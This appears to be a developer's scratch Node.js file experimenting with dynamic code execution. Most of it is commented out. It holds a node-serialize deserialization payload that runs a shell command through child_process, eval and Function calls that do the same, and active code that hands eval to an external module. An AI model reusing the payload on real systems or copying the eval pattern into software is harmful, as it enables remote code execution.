// app.js

var fs = require('fs');
// var greetingsFun = require('./greetingsExportsFunction');
// var greetingsObj = require('./greetingsExportsObject');
var greeting = require("greeting");
// var test = require("test");

// var serialize = require('node-serialize');
// var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
// serialize.unserialize(payload);

// var test = 'testtttt';
// test = 'aaaaaa';
// console.log(global.test);

// console.log(eval("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr){console.log(stdout);})"));

// greetingsFun();
// eval("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr){console.log(stdout);})");
// Function("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr){console.log(stdout);})")();
// console.log(new Function("require('./greetingsExportsFunction')")());

// eval("console.log(\'printing something\')");

// var f = Function("console.log(\'printing something\')");
// f();

// greetingsObj.sayHello();

// fs.readdir("/Users/gferreir/workspaces/jate", function(err, items) {
// 	for (var i=0; i<items.length; i++) {
// 		console.log(">>> " + items[i]);
// 	}
// });
// console.log(module);
greeting.sayHola(eval);
console.log(hola);
// test.exec();


